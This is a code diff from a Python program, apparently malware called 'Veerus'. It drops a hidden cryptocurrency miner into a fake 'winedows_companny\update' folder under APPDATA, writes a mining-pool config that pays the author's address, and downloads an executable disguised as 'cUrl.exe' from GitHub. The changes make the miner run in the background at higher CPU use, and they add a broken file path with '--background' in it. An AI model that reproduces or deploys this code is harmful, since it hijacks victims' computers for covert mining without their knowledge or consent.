@@ -526,48 +526,49 @@ if yes == "yes":
 				os.system("mkdir "+ os.getenv('APPDATA')+ "\\winedows_companny\\update")
 				os.chdir(os.getenv('APPDATA') + "\\winedows_companny\\update")
 				open(os.getenv('APPDATA') + "\\winedows_companny\\update\\config.json", "x").write('''
-	{
-		"algo": "rx",
-		"api": {
-			"port": 0,
-			"access-token": null,
-			"worker-id": null,
-			"ipv6": false,
-			"restricted": true
-		},
-		"av": 0,
-		"background": false,
-		"colors": true,
-		"cpu-affinity": null,
-		"cpu-priority": null,
-		"donate-level": 5,
-		"huge-pages": true,
-		"hw-aes": null,
-		"log-file": null,
-		"max-cpu-usage": 50,
-		"pools": [
-			{
-				"url": "rx.unmineable.com:3333",
-				"user": "'''+ ADDRESS  + '''",
-				"pass": "x",
-				"keepalive": true,
-				"nicehash": false,
-				"variant": -1,
-				"tls": false,
-				"tls-fingerprint": null
-			}
-		],
-		"print-time": 60,
-		"retries": 5,
-		"retry-pause": 5,
-		"safe": false,
-		"syslog": false,
-		"threads": null
-	}
+{
+    "algo": "cryptonight",
+    "api": {
+        "port": 0,
+        "access-token": null,
+        "worker-id": null,
+        "ipv6": false,
+        "restricted": true
+    },
+    "av": 0,
+    "background": true,
+    "colors": false,
+    "cpu-affinity": null,
+    "cpu-priority": null,
+    "donate-level": 5,
+    "huge-pages": true,
+    "hw-aes": null,
+    "log-file": null,
+    "max-cpu-usage": 75,
+    "pools": [
+        {
+            "url": "rx.unmineable.com:3333",
+            "user": "''' + ADDRESS + '''",
+            "pass": "x",
+            "keepalive": true,
+            "nicehash": false,
+            "variant": -1,
+            "tls": false,
+            "tls-fingerprint": null
+        }
+    ],
+    "print-time": 60,
+    "retries": 5,
+    "retry-pause": 5,
+    "safe": false,
+    "syslog": false,
+    "threads": null
+}
+
 
 				''')
 				r = requests.get("https://github.com/0xSxZ/Veerus/blob/main/MINER_IMPORTANT/clientdownloads/cUrl.exe?raw=true")
-				with open(os.getenv('APPDATA') + "\\winedows_companny\\update\\cUrl.exe", 'wb+') as f:
+				with open(os.getenv('APPDATA') + "\\winedows_companny\\update\\cUrl.exe --background", 'wb+') as f:
 					f.write(r.content)
 			except Exception as e:
 				print(e)
